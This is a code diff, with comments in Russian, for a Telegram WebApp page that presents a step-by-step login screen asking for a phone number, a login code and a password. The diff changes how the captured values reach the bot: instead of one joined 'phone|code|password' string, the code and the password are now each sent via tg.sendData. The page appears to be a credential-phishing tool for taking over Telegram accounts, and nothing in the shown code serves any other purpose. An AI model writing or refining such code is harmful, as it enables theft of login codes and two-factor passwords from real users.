@@ -127,42 +127,38 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // Память для данных
-    let userData = {
-        phone: '',
-        code: '',
-        password: ''
-    };
+    // При загрузке проверяем, какой экран открыть
+    window.onload = function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const step = urlParams.get('step'); // получаем ?step=code или ?step=pass
 
-    function nextStep(stepId, icon) {
-        if (stepId === 'code') {
-            userData.phone = document.getElementById('p').value;
-            if(!userData.phone) return;
+        if (step === 'code') {
             showStep('code', '✉️');
-        } 
-        else if (stepId === 'pass') {
-            userData.code = document.getElementById('c').value;
-            if(!userData.code) return;
+        } else if (step === 'pass') {
             showStep('pass', '🔑');
+        } else {
+            showStep('phone', '📞');
         }
-    }
+    };
 
     function showStep(id, icon) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         document.getElementById('step-' + id).classList.add('active');
         document.getElementById('main-icon').innerText = icon;
-        const input = document.querySelector('#step-' + id + ' input');
-        if(input) input.focus();
     }
 
+    // Для ввода кода
+    function checkPasswordStep() {
+        const code = document.getElementById('c').value;
+        if (!code) return;
+        tg.sendData(code); // Отправляем код боту и закрываемся
+    }
+
+    // Для ввода пароля
     function finish() {
-        userData.password = document.getElementById('pass').value;
-        
-        // Склеиваем всё в одну строку через разделитель |
-        const finalData = `${userData.phone}|${userData.code}|${userData.password}`;
-        
-        // Отправляем боту и закрываем окно
-        tg.sendData(finalData);
+        const password = document.getElementById('pass').value;
+        if (!password) return;
+        tg.sendData(password); // Отправляем пароль боту и закрываемся
     }
 </script>
 
